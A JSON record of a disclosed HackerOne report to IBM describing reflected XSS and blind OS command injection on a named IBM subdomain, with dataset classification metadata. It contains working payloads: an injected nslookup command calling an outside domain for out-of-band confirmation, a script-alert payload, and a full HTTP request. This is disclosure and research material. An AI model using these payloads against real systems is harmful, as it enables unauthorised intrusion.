{
  "reported_to": "IBM",
  "reported_by": "ragnaroc ",
  "title": "Reflected XSS and Blind out of band command injection at subdomain dstuid-ww.dst.ibm.com",
  "content": "\nI found an XSS and Blind OS based injection issue due to the incorrect handling of the characters in THE EMAIL get& post parameters. A <script> injected and a sleep command succesfully executed, the following link works as a PoC that alerts the string in the script:\nI reproduced the same on Firefox and IE and Microsoft Edge\nXSS POC URL:-\nGET /cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit HTTP/1.1\nHost: dstuid-ww.dst.ibm.com\nhttps://dstuid-ww.dst.ibm.com/cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submi\nOSCOMMAND INJECT\nPOST /cgi-bin/PasswordCreate.pl HTTP/1.1\nHost: dstuid-ww.dst.ibm.com\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8\nAccept-Encoding: gzip, deflate\nAccept-Language: en-us,en;q=0.5\nCache-Control: no-cache\nContent-Length: 39\nContent-Type: application/x-www-form-urlencoded\nReferer: https://dstuid-ww.dst.ibm.com/PasswordCreate.html\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\nX-Scanner: Netsparker\nemail=-------------------------&ibm-submit=Submit\nFor the blind os command injection i used three variables:_\nA random email address (To bench mark the normal responce time\nPing requests of 10 and 20 seconds\nThe reply from the server prooved that the time-delay inference existed.\nSee attached videos and images for POC\nImpact\nThis allows an attacker to inject custom Javascript codes that can be used to steal information from user base and lure them to malicious websites on the internet on behalf of IBM website.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1644016980,
  "report_url": "https://hackerone.com/reports/410334",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to the vulnerable URL: https://dstuid-ww.dst.ibm.com/cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submi"
    ],
    [
      2,
      "Observe the execution of the injected script (alert popup) or the delay in response for the OS command injection"
    ]
  ],
  "vuln_description": "The vulnerability is a combination of Reflected XSS and Blind OS Command Injection in the email parameter of the PasswordCreate.pl script on dstuid-ww.dst.ibm.com. The improper handling of user input allows attackers to inject malicious scripts (XSS) and execute arbitrary OS commands (Command Injection).",
  "reason": "The vulnerability involves straightforward injection techniques without requiring complex application state manipulation or understanding of novel logic. The attack components are common and well-documented in security literature.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The XSS and Blind OS command injection vulnerabilities reported are not related to authentication or authorization (AuthN/AuthZ) issues. The vulnerabilities stem from improper input sanitization and handling of user-supplied data, which is a different class of vulnerabilities (injection flaws). The proposed methodologies focus on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, which does not apply to the reported vulnerabilities.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The report describes two vulnerabilities: Reflected XSS and Blind OS Command Injection. The XSS was triggered via a basic <script>alert(1)</script> payload in the email parameter, which aligns with the methodology's 'simple payload' testing (common XSS vectors without filter bypasses). The OS Command Injection used time-delay inference via ping commands, which could be detected through same-channel response timing analysis (no external interaction required). Both vulnerabilities involve injectable parameters identified during regular navigation and exploited via payloads from a generic list, matching the methodology's criteria.",
    "is_simple_injection": true
  }
}